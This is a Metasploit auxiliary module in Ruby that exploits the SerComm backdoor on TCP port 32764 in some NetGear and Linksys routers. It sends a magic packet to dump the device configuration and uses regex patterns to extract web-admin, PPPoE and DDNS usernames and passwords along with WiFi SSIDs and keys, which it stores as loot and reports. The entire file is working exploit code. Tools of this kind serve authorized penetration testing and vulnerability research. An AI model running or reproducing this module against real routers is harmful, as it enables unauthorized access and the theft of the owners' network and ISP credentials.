require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SerComm Device Configuration Dump",
      'Description'    => %q{
          This module will dump the configuration of several SerComm devices. These devices
          typically include routers from NetGear and Linksys.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>',   #Initial discovery, poc
          'Matt "hostess" Andreko <mandreko[at]accuvant.com>',  #Msf module
        ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ],
        ],
      'DisclosureDate' => "Dec 31 2013" ))

      register_options(
        [
          Opt::RPORT(32764),
        ], self.class)
  end

  Settings = {
    'Creds' => [
      [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
      [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
      [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
    ],
    'General' => [
      ['Wifi SSID', /wifi_ssid=(\S+)/i],
      ['Wifi Key 1', /wifi_key1=(\S+)/i],
      ['Wifi Key 2', /wifi_key2=(\S+)/i],
      ['Wifi Key 3', /wifi_key3=(\S+)/i],
      ['Wifi Key 4', /wifi_key4=(\S+)/i]
    ]
  }

  def run

    print_status("Attempting to connect to #{rhost} to dump configuration.")

    connect

    data = [0x53634d4d, 0x01, 0x00].pack("VVV")
    sock.put(data)
    junk = sock.get_once # The MMcS text shows up again for some reason
    response = sock.get(3, 3)

    disconnect

    if response.nil? or response.empty?
      print_status("No response from server")
      return
    end

    vprint_status("Response: #{response}")

    loot_file = store_loot("router.config", "text/plain", rhost, response, "#{rhost}router_config.txt", "Router Configurations")
    print_status("Router configuration dump stored in: #{loot_file}")

    configs = response.split(?\x00)

    if (datastore['VERBOSE'])
      vprint_status('All configuration values:')
      configs.sort.each do |i|
        if i.strip.match(/.*=\S+/)
          vprint_status(i)
        end
      end
    end

    Settings['General'].each do |regex|
      configs.each do |config|
        if config.match(regex[1])
          value = $1
          print_status("#{regex[0]}: #{value}")
        end
      end
    end

    Settings['Creds'].each do |cred|
      user = nil
      pass = nil

      # find the user/pass
      configs.each do |config|
        if config.match(cred[1]['user'])
          user = $1
        end
        if config.match(cred[1]['pass'])
          pass = $1
        end
      end

      # if user and pass are specified, report on them
      if user and pass
        print_status("#{cred[0]}: User: #{user} Pass: #{pass}")
        auth = {
          :host => rhost,
          :port => rport,
          :user => user,
          :pass => pass,
          :type => 'password',
          :source_type => "exploit",
          :active => true
        }
        report_auth_info(auth)
      end
    end

  end
end
